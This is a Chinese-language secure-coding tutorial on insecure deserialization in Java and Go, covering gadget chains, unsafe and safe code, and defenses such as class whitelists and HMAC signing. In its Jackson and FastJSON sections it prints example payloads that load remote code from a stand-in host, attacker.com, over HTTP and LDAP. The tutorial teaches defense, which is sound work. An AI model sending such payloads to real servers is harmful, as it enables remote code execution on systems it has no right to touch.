---
title: "Day 14：不安全的反序列化（Insecure Deserialization）"
date: 2026-05-09
tags: ["反序列化", "OWASP Top 10"]
---

# Day 14：不安全的反序列化（Insecure Deserialization）

> **適合對象**：後端工程師初學者
> **語言範例**：Java（1.8 / 21）、Go
> **OWASP 對應**：A08:2021 - Software and Data Integrity Failures

---

## 一、為什麼這個漏洞值得你害怕？

在後端開發者圈子裡，有句半開玩笑的話：

> 「SQL Injection 讓你被偷資料，反序列化漏洞讓你直接被偷整台伺服器。」

這不是誇張。歷史上幾個轟動的 RCE（Remote Code Execution，遠端程式碼執行）事件，背後都是反序列化漏洞：

- **2015 年 Apache Commons Collections**：所有用了這個函式庫且接收外部序列化資料的 Java 系統都中招，包括 WebSphere、JBoss、WebLogic、Jenkins。
- **FastJSON 系列漏洞**：阿里巴巴的 JSON 函式庫，2017 至今爆出多次 RCE。
- **PayPal、Spring 框架**也都曾因此被攻擊。

最可怕的是：攻擊者只需要送一份「看起來無害的資料」，伺服器在「解析」這份資料時就會自動執行任意程式碼——攻擊者甚至不用登入。

---

## 二、序列化是什麼？反序列化又是什麼？

先用一個生活化的比喻：

想像你要把一個樂高城堡寄給朋友。直接整個寄太大太重，所以你**拆解（序列化）**成一塊塊放進箱子；朋友收到後再**重新組裝（反序列化）**回原樣。

在程式裡也一樣：
- **序列化（Serialization）**：把記憶體裡的物件 → 變成可儲存或傳輸的格式（位元組、JSON、XML）。
- **反序列化（Deserialization）**：把那份資料 → 還原成記憶體裡的物件。

```
Object  ──序列化──>  bytes / JSON  ──反序列化──>  Object
```

常見場景：
- Session 存到 Redis（序列化後丟進去）
- RPC、訊息佇列傳遞物件
- 寫檔保存使用者狀態
- API 接收 JSON 並轉成物件

問題就出在最後一個。

---

## 三、攻擊原理：一份資料，為什麼能執行程式？

關鍵在於：**反序列化不只是「填資料」，它會在還原物件的過程中執行某些方法**。

### Java 的危險點

Java 的 `ObjectInputStream.readObject()` 在反序列化時會：

1. 根據 class name 找出對應的類別。
2. 建立物件實例。
3. **呼叫該類別的 `readObject()` 方法**（如果有定義）。
4. 觸發 `readResolve()`、`finalize()` 等方法。

攻擊者的策略：

> 找一條「方法呼叫鏈（Gadget Chain）」——一系列彼此會觸發的類別，最終串到 `Runtime.exec()` 之類能執行系統指令的方法。

只要 classpath 上有適合的「零件」（例如老版本的 Apache Commons Collections），攻擊者就能組裝出「一份位元組陣列 → 開機關機、刪檔、反向 shell」的攻擊。

### 簡化的危險範例（Java 1.8 / 21 都受影響）

```java
// 錯誤示範：直接信任外部送進來的 byte[]
public User loadUserFromBytes(byte[] data) throws Exception {
    try (ObjectInputStream ois =
             new ObjectInputStream(new ByteArrayInputStream(data))) {
        return (User) ois.readObject();   // ← 危險！
    }
}
```

這段程式只要 `data` 是攻擊者可控的（從 HTTP、Cookie、檔案上傳取得），且 classpath 上存在可利用的 gadget，就可能直接 RCE。

---

## 四、不只 Java：JSON、YAML 也會中

很多人以為「我用 JSON 就安全了」，但下面這幾個情境照樣危險：

### 1. Jackson 啟用了 `enableDefaultTyping`

```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();   // ← 不要這樣做！

// 攻擊者送來：
// {"@class":"org.springframework.context.support.ClassPathXmlApplicationContext",
//  "configLocation":"http://attacker.com/evil.xml"}
mapper.readValue(json, Object.class);
```

當 Jackson 看到 `@class`，會根據裡面的類別名動態建立物件，攻擊者就能指向「會載入遠端設定」的 Spring 類別，達成 RCE。

### 2. FastJSON 的 `@type`

歷史上 FastJSON 也有同樣的問題，攻擊 payload 大致長這樣：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://attacker.com/Exploit",
 "autoCommit":true}
```

伺服器一旦解析就會去 LDAP 抓取惡意類別。

### 3. SnakeYAML

```java
Yaml yaml = new Yaml();   // 預設危險！
yaml.load(userInput);     // 接收 !!javax.script.ScriptEngineManager 之類的標籤
```

---

## 五、Go 也會嗎？

Go 沒有「自動呼叫魔法方法」的設計，`encoding/json`、`encoding/gob` 都不會自動執行任意類別建構式。但 Go 仍有相關風險：

1. **`encoding/gob`**：只接受預先註冊的型別，相對安全；但若邏輯有漏洞，攻擊者仍可造成型別混淆。
2. **YAML 套件（gopkg.in/yaml.v2 / v3）**：基本安全，但若把解析後資料直接丟進 `template`、`exec`、SQL 就會出事——這比較像下游的 injection。
3. **第三方套件解析使用者輸入後反射呼叫**：例如某些 RPC 框架若接收 type name 後 `reflect.New`，可能讓攻擊者控制型別。

整體而言，Go 的反序列化攻擊面比 Java 小，但**「型別混淆 + 後續 injection」** 仍是要留意的。

---

## 六、防禦方法（重點來了）

### 防禦原則排序

| 優先級 | 做法 | 說明 |
|--------|------|------|
| ★★★★★ | **不要對不可信來源做反序列化** | 最根本的解 |
| ★★★★ | 改用「資料導向」格式（純 JSON 不帶型別資訊） | 不讓對方指定類別 |
| ★★★ | 白名單限制可反序列化的類別 | 即使被攻擊也限縮影響 |
| ★★★ | 加上完整性驗證（HMAC 簽章） | 確保資料沒被竄改 |
| ★★ | 套件即時更新、移除危險函式庫 | 減少 gadget 來源 |

### Java 實作範例

#### ❌ 錯誤：直接讀外部輸入

```java
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // 災難
```

#### ✅ 正確 1：用白名單過濾類別（Java 9+ 內建 ObjectInputFilter）

```java
import java.io.ObjectInputFilter;

ObjectInputStream ois = new ObjectInputStream(input);

// 只允許特定 package 與基本型別
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.mycompany.dto.*;java.lang.*;java.util.*;!*"
);
ois.setObjectInputFilter(filter);

Object obj = ois.readObject();
```

> Java 1.8 也有 backport 的 `sun.misc.ObjectInputFilter`，或可自行實作 `resolveClass()`。Java 17+ 還支援 JVM 全域的 `jdk.serialFilter` 系統屬性。

#### ✅ 正確 2：改用純 JSON + 強型別（Jackson 預設安全模式）

```java
ObjectMapper mapper = new ObjectMapper();
// 千萬不要呼叫 enableDefaultTyping()
// 直接綁定到具體 DTO，不接受 @class
UserDto user = mapper.readValue(jsonInput, UserDto.class);
```

關鍵：**讓伺服器決定型別**，而不是讓資料來決定。

#### ✅ 正確 3：HMAC 簽章 + Session 不放可執行物件

如果一定要序列化（例如分散式 Session），把序列化後的位元組做 HMAC 簽章，反序列化前先驗章。並且**只放純資料 DTO，不放含 `Runnable`、`InvocationHandler`、Spring Bean 等危險物件**。

```java
public byte[] sign(byte[] data, SecretKey key) throws Exception {
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(key);
    return mac.doFinal(data);
}

public Object readVerified(byte[] payload, byte[] expectedMac, SecretKey key)
        throws Exception {
    byte[] actual = sign(payload, key);
    if (!MessageDigest.isEqual(actual, expectedMac)) {
        throw new SecurityException("資料完整性驗證失敗");
    }
    // 通過驗證才反序列化
    try (ObjectInputStream ois =
             new ObjectInputStream(new ByteArrayInputStream(payload))) {
        ois.setObjectInputFilter(safeFilter());
        return ois.readObject();
    }
}
```

### Go 實作範例（避免型別混淆）

```go
// 不要直接把使用者送來的 JSON 解析到 interface{} 後到處用
// ❌ 錯誤
var anything interface{}
json.Unmarshal(input, &anything)
doSomething(anything) // 後續可能根據型別做不同處理 → 攻擊面

// ✅ 正確：明確定義 struct
type UserDto struct {
    ID    int64  `json:"id"`
    Name  string `json:"name"`
    Email string `json:"email"`
}

var u UserDto
if err := json.Unmarshal(input, &u); err != nil {
    return err
}
// 用具體欄位，不會出現意外型別
```

對於 `gob`：

```go
// gob 會根據註冊的型別還原
gob.Register(&UserDto{})

dec := gob.NewDecoder(reader)
var u UserDto
if err := dec.Decode(&u); err != nil {
    return err
}
```

只要事先註冊白名單型別，就不會有 Java 那種「載入任意 class」的問題。

---

## 七、實戰情境：把今天學到的串起來

假設你在維運一個 Spring Boot 後端，要把使用者偏好設定存到 Redis：

**錯誤做法**：把整個 `UserPreference` 物件用 Java Serializable 直接 `redisTemplate.opsForValue().set(key, prefs)`，並且 Redis 是公司內網共用的。

**問題**：
- 若 Redis 被攻陷或內網有橫向移動的攻擊者，他可以塞入惡意 payload；
- 你的後端讀回時會自動 `readObject()`，立刻 RCE。

**正確做法**：
1. 用 JSON 序列化（`Jackson2JsonRedisSerializer`），且不啟用 default typing；
2. Redis 設密碼 + 限制網路；
3. 對 Redis value 做 HMAC 簽章；
4. 只在 DTO 放純資料欄位，避免帶可執行邏輯的物件。

---

## 八、給你的 Checklist

開發前自問：
- [ ] 我有沒有對「使用者送來的位元組」做 `readObject` / `Object.class` 反序列化？
- [ ] 我用的 JSON / YAML / XML 函式庫是否啟用了「型別資訊」（`@class`、`@type`、`!!java`）？
- [ ] 我的 classpath 上有沒有歷史漏洞已知的 gadget 套件？
- [ ] 我從 Cookie、Header、Query string 拿到的資料，有沒有經過完整性驗證？
- [ ] 我的反序列化過程有沒有用白名單限制可建立的型別？

---

## 九、明天的預告

明天 Day 15 會介紹 **敏感資料保護與密鑰管理（Secrets Management）**——為什麼把資料庫密碼、API key 寫死在 `application.properties` / `.env` 是 production 級災難、為什麼 git 不小心 push 一次金鑰就再也救不回來、以及怎麼用 Vault / AWS Secrets Manager 這類工具管理 secrets 與輪替（rotation）。

---

## 延伸閱讀

- OWASP Cheat Sheet: Deserialization
- ysoserial 工具（研究用，了解 gadget chain 是怎麼組成的）
- JEP 290（Java 9 引入的 ObjectInputFilter 機制）
- CVE-2015-4852（Apache Commons Collections）

> 記住一句話：**不要對不可信的來源反序列化**——這幾乎是所有反序列化漏洞的萬用解。
